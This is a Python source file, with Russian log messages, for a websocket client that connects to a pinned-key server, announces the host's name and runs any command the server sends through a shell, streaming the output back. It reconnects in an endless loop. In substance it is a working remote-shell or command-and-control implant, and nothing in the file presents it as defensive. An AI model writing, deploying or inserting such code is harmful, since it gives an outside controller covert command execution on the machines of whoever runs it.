import asyncio
import json
import subprocess
import socket
import websockets
import ssl

import hashlib


from cryptography import x509
from cryptography.hazmat.primitives import serialization


def extract_public_key(cert_bin: bytes) -> str:
    cert = x509.load_der_x509_certificate(cert_bin)

    pub = cert.public_key()

    der = pub.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    return hashlib.sha256(der).hexdigest()


def get_ip():
    ip = "127.0.0.1"
    print(ip)
    return ip


def fingerprint(key: str):
    return hashlib.sha256(key.encode()).hexdigest()


def get_hostname():
    return socket.gethostname()


async def send_init(ws):
    msg = {"type": "live", "payload": {"hostname": get_hostname()}}
    await ws.send(json.dumps(msg))
    print("live отправлен")


async def send_output(ws, proc):
    for line in proc.stdout:
        line = line.rstrip("\n")
        print(line)

        msg = {"type": "client_line", "payload": line}

        await ws.send(json.dumps(msg))


async def execute_command(command, ws):
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )

        await send_output(ws, proc)
        proc.wait()

    except Exception as e:
        print("ошибка выполнения:", e)


async def handle_message(ws, raw):
    try:
        msg = json.loads(raw)
    except:
        print("кривой JSON:", raw)
        return

    msg_type = msg.get("type")
    payload = msg.get("payload")

    print("ответ сервера:", msg)

    if msg_type == "live_ack":
        print("connected")

    elif msg_type == "message":
        print("payload:", payload)
        await execute_command(payload, ws)

    elif msg_type == "error":
        print("сервер ругается:", payload)

    else:
        print("непонятный тип:", msg_type)


async def run_client():
    while True:
        try:
            async with websockets.connect(SERVER_URL, ssl=ssl_context) as ws:
                cert = ws.transport.get_extra_info("ssl_object").getpeercert(
                    binary_form=True
                )

                server_pub = extract_public_key(cert)

                print(f"server_pub: {server_pub}\nEXPECTED_FP: {EXPECTED_FP}")

                if server_pub != EXPECTED_FP:
                    raise Exception("MITM detected")
                print("сервер подтверждён")

                await send_init(ws)

                while True:
                    data = await ws.recv()
                    await handle_message(ws, data)

        except Exception as e:
            print("ошибка соединения:", e)
            await asyncio.sleep(5)


if __name__ == "__main__":
    ip = get_ip()
    SERVER_URL = f"wss://{ip}:8000/wss"
    ssl_context = ssl._create_unverified_context()
    EXPECTED_FP = "603cb37a9c54024026b6c92884c8d2fa26a7b386ba93904b8f5d10d515e6f057"

    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        print("KeyboardInterrupt")
